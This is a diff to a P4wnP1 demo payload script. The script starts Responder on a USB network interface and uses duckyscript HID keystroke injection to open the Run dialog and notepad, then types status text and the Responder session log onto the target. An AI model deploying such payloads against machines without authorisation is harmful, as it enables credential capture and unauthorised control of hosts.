@@ -1,3 +1,10 @@
+# Demo payload
+# starts Responder on RNDIS / CDC ECM interface
+# prints out stats in several payload stages via HID keyboard on target
+# prints out some stats to screen of P4wnP1
+# automatically brings Responder screen session to front on login
+# (the session could be detached by pressin <CTRL>+<A> , <D>)
+
 echo "Payload1 included"
 
 function onNetworkUp()
@@ -20,7 +27,24 @@ function onNetworkUp()
 
 	touch /tmp/responder_started
 
-	# print Network is running via Keyboard to host
+
+	# test for duckyscript
+	# !!Note: the delays dramatically increase boot time and are only used for HID demo purposes
+	cat << EOF | duckhid
+DELAY 500
+GUI r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 1000
+STRING 2 seconds delay before next output (delay test)
+ENTER
+DELAY 2000
+STRING Delay passed by
+ENTER
+EOF
+	# print Network is running via Keyboard to host (test ASCII output via HID keyboard)
+	# keyboard layout is derived from setup.cfg
 	echo "Network is running" | outhid
 }
 
@@ -35,6 +59,7 @@ function onTargetGotIP()
 	# add DNS entry for google DNS
 	echo nameserver 8.8.8.8 > /etc/resolv.conf
 
+	echo "Target got IP $target_ip via DHCP" | outhid
 }
 
 function onBootFinished()
@@ -43,7 +68,11 @@ function onBootFinished()
 	# as long as P4wnP1 gets connected to a target host
 
 	# print "Boot finished" via HID keyboard (languag layoute selected in setup.cfg)
-	echo "Boot finished" | outhid
+	echo "P4wnP1 boot up finished" | outhid
+
+	echo "Next the output of command 'cat /tmp/Responder-Session.log' is sent to keyboard" | outhid
+	echo "Testing file output via keyboard" | outhid
+	cat /tmp/Responder-Session.log | outhid
 }
 
 # commands in this function are ran on user login
